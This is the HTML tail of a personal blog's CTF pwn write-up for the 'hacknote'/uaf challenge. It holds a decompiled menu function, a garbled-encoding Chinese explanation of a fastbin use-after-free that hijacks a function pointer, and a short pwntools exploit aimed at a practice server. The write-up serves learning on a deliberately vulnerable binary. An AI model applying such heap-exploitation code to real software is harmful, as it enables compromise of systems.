class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­˜æ”¾å †çš„ç»“æ„å¦‚ä¸‹:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">notelist--&gt;heap0--&gt;print_function_addr</span><br><span class="line">            .	|_&gt;malloced_heap</span><br><span class="line">            .</span><br><span class="line">            .</span><br></pre></td></tr></table></figure>

<p>ç”¨äºŒçº§æŒ‡é’ˆ ä¸€çº§æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ª<code>content[2]</code> å…¶ä¸­<code>content[0]</code>æ˜¯ä¸€ä¸ªè¾“å‡ºå‡½æ•°çš„åœ°å€ æ¯ä¸ªç”³è¯·çš„å †éƒ½ä¼šå­˜æ”¾è¿™ä¸ªå‡½æ•°åœ°å€ <code>content[1]</code>å°±æ˜¯çœŸæ­£ç”³è¯·åˆ°çš„å † è¦è¯»å–å †çš„æ•°æ®æ—¶å°±è°ƒç”¨<code>content[0]</code> ç”¨æˆ·é‡Šæ”¾å †æ—¶å…ˆé‡Šæ”¾<code>content[1]</code>å†é‡Šæ”¾<code>content</code></p>
<p>è¿™é¢˜çš„ä¸€ä¸ªé‡ç‚¹æ˜¯<code>content</code>ä¹Ÿæ˜¯<code>malloc(8)</code>ç”³è¯·å‡ºæ¥çš„(32ä½ç¨‹åºä¸€ä¸ªåœ°å€4å­—èŠ‚) è¿™é¢˜æ²¡æœ‰ç¼–è¾‘å‡½æ•° åˆ›å»ºæ—¶æ ¹æ®è¦ç”³è¯·çš„sizeæ¥è¯»å…¥æ•°æ®</p>
<p>å› ä¸ºè¿™é¢˜ç»™äº†åé—¨å‡½æ•° æ‰€ä»¥å®é™…ä¸Šæˆ‘å¹¶æ²¡æœ‰åˆ©ç”¨åˆ° uaf(ä¸çŸ¥é“å“ªé‡Œå­˜åœ¨uaf) è¿™é‡Œåˆ©ç”¨çš„ç‚¹å°±æ˜¯ç”¨æˆ·ç”³è¯·ä¸€ä¸ªå †çš„åŒæ—¶ä¼šå…ˆç”³è¯·8bytesçš„chunk å¦‚æœç”¨æˆ·ç”³è¯·çš„å°±æ˜¯8bytesçš„chunk é‚£ä¹ˆæ ¹æ®Fastbinåˆ†é…chunkçš„è§„åˆ™ å¦‚æœä¹‹å‰é‡Šæ”¾è¿‡chunk(å¤§å°ä¸æ˜¯8bytes) Fastbinä¸­å°±ä¼šåŠ å…¥è¢«é‡Šæ”¾çš„<code>content</code> æ­¤æ—¶ç”¨æˆ·æœ‰å¯èƒ½ä¼šç”³è¯·åˆ°æŒ‡å‘<code>content[0]</code>çš„å † å¹¶ä¸”å¯ä»¥è¦†ç›–å…¶ä¸­çš„<code>print_note_content</code> è€Œç¨‹åºåœ¨é‡Šæ”¾å †æ—¶æ²¡æœ‰å°†æŒ‡å‘<code>content[0]</code>çš„æŒ‡é’ˆç½®é›¶ è°ƒç”¨æ‰“å°å‡½æ•°æ—¶ä¹Ÿä¸ä¼šæ£€æµ‹æ˜¯å¦æ˜¯å·²è¢«é‡Šæ”¾çš„å † æ‰€ä»¥åªéœ€è¦é‡Šæ”¾ä¸¤ä¸ªé8byteså¤§å°çš„chunk(ä¾‹å¦‚chunk0, chunk1) ç„¶åç”³è¯·ä¸€ä¸ªå¤§å°ä¸º8bytesçš„chunk2 è¿™æ—¶å€™æ ¹æ®Fastbinçš„åˆ†é…åŸåˆ™ä¼šå°†chunk1çš„<code>content</code>åˆ†é…ç»™chunk2çš„<code>content</code> å°†chunk0çš„<code>content</code>åˆ†é…ç»™chunk2çš„<code>content[1]</code> è¿™æ—¶å€™ç»™chunk2çš„å†…å®¹åˆå§‹åŒ–ä¸ºåé—¨å‡½æ•°å†è°ƒç”¨readnoteçš„å‡½æ•°è¯»å–chunk0å°±ä¼šè§¦å‘åé—¨ exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">vlun = p32(elf.symbols[<span class="string">&#x27;magic&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, xxxxx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_note</span>(<span class="params">ind</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(ind).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_note</span>(<span class="params">content</span>):</span><br><span class="line">    size = <span class="built_in">len</span>(content)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size :&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_note</span>(<span class="params">ind</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(ind).encode())</span><br><span class="line"></span><br><span class="line">add_note(<span class="string">b&#x27;0&#x27;</span> * <span class="number">0x20</span>)   <span class="comment">#0</span></span><br><span class="line">add_note(<span class="string">b&#x27;1&#x27;</span> * <span class="number">0x20</span>)   <span class="comment">#1</span></span><br><span class="line">add_note(<span class="string">b&#x27;2&#x27;</span> * <span class="number">0x20</span>)   <span class="comment">#2</span></span><br><span class="line">del_note(<span class="number">0</span>)</span><br><span class="line">del_note(<span class="number">1</span>)</span><br><span class="line">add_note(vlun)          <span class="comment">#3</span></span><br><span class="line">print_note(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/05/10/Frida%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="prev" title="Fridaå­¦ä¹ è®°å½•">
      <i class="fa fa-chevron-left"></i> Fridaå­¦ä¹ è®°å½•
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/07/18/angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="next" title="Angrå­¦ä¹ è®°å½•">
      Angrå­¦ä¹ è®°å½• <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9B%B6%E7%A2%8E%E7%9F%A5%E8%AF%86"><span class="nav-number">1.</span> <span class="nav-text">é›¶ç¢çŸ¥è¯†</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E5%B8%A7%E7%BB%93%E6%9E%84"><span class="nav-number">1.1.</span> <span class="nav-text">æ ˆå¸§ç»“æ„</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GEF%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-number">1.2.</span> <span class="nav-text">GEFå¸¸ç”¨æŒ‡ä»¤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#telescope-dereference-register"><span class="nav-number">1.2.1.</span> <span class="nav-text">telescope | dereference [register]</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pattern"><span class="nav-number">1.2.2.</span> <span class="nav-text">pattern</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IDA%E9%85%8D%E5%90%88Pwntools%E8%BF%9B%E8%A1%8C%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-number">1.3.</span> <span class="nav-text">IDAé…åˆPwntoolsè¿›è¡ŒåŠ¨æ€è°ƒè¯•</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="nav-number">2.</span> <span class="nav-text">åˆ·é¢˜è®°å½•</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwnable-tw-Start-stackoverflow-ret2shellcode"><span class="nav-number">2.1.</span> <span class="nav-text">Pwnable.tw-Start | stackoverflow | ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwnable-tw-orw-shellcode"><span class="nav-number">2.2.</span> <span class="nav-text">Pwnable.tw-orw | shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.3.</span> <span class="nav-text">BUUOJ-[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E8%A6%81%E7%82%B9-%E5%BE%85%E8%A1%A5%E5%85%85"><span class="nav-number">2.3.1.</span> <span class="nav-text">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¦ç‚¹(å¾…è¡¥å……)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-ciscn-2019-c-1-ret2libc"><span class="nav-number">2.4.</span> <span class="nav-text">BUUOJ-ciscn_2019_c_1 | ret2libc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GOT%E8%A1%A8%E5%92%8CPLT%E8%A1%A8"><span class="nav-number">2.4.1.</span> <span class="nav-text">GOTè¡¨å’ŒPLTè¡¨</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-OGeek2019-babyrop-ret2libc"><span class="nav-number">2.5.</span> <span class="nav-text">BUUOJ-[OGeek2019]babyrop | ret2libc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-ciscn-2019-ne-5-%E7%AE%80%E5%8D%95canary"><span class="nav-number">2.6.</span> <span class="nav-text">BUUOJ-ciscn_2019_ne_5 | ç®€å•canary</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E8%BF%B7%E6%80%9D"><span class="nav-number">2.6.1.</span> <span class="nav-text">ä¸€äº›è¿·æ€</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#23-7-16"><span class="nav-number">2.6.1.1.</span> <span class="nav-text">23&#x2F;7&#x2F;16</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-ciscn-2019-es-2-%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">2.7.</span> <span class="nav-text">BUUOJ-ciscn_2019_es_2 | æ ˆè¿ç§»</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">2.7.1.</span> <span class="nav-text">æ ˆè¿ç§»</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-babyheap-0ctf-2017-%E5%A0%86%E6%BA%A2%E5%87%BA-Use-after-free"><span class="nav-number">2.8.</span> <span class="nav-text">BUUOJ-babyheap_0ctf_2017 | å †æº¢å‡º | Use after free</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="nav-number">2.8.1.</span> <span class="nav-text">å…·ä½“æ€è·¯</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96chunk1%E7%9A%84header"><span class="nav-number">2.8.1.1.</span> <span class="nav-text">è¦†ç›–chunk1çš„header</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%A6%86%E7%9B%96chunk2%E7%9A%84chunk1%E6%B3%84%E9%9C%B2libc-base"><span class="nav-number">2.8.1.2.</span> <span class="nav-text">ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc base</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96chunk2%E7%9A%84fd%E5%AD%97%E6%AE%B5%E4%BC%AA%E9%80%A0fake-chunk"><span class="nav-number">2.8.1.3.</span> <span class="nav-text">è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A6%86%E7%9B%96-malloc-hook"><span class="nav-number">2.8.1.4.</span> <span class="nav-text">è¦†ç›–__malloc_hook</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-inndy-rop-%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91pwn"><span class="nav-number">2.9.</span> <span class="nav-text">BUUOJ-inndy_rop | é™æ€ç¼–è¯‘pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUUOJ-ZJCTF-2019-EasyHeap-Fastbin-Attack"><span class="nav-number">2.10.</span> <span class="nav-text">BUUOJ-[ZJCTF 2019]EasyHeap | Fastbin Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hitcontraining-uaf-Use-after-free"><span class="nav-number">2.11.</span> <span class="nav-text">hitcontraining_uaf | Use after free</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="1K0CT B14s"
      src="/images/myavatar.gif">
  <p class="site-author-name" itemprop="name">1K0CT B14s</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        <!--
-->

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">1K0CT B14s</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="ç«™ç‚¹æ€»å­—æ•°">375k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="ç«™ç‚¹é˜…è¯»æ—¶é•¿">5:40</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
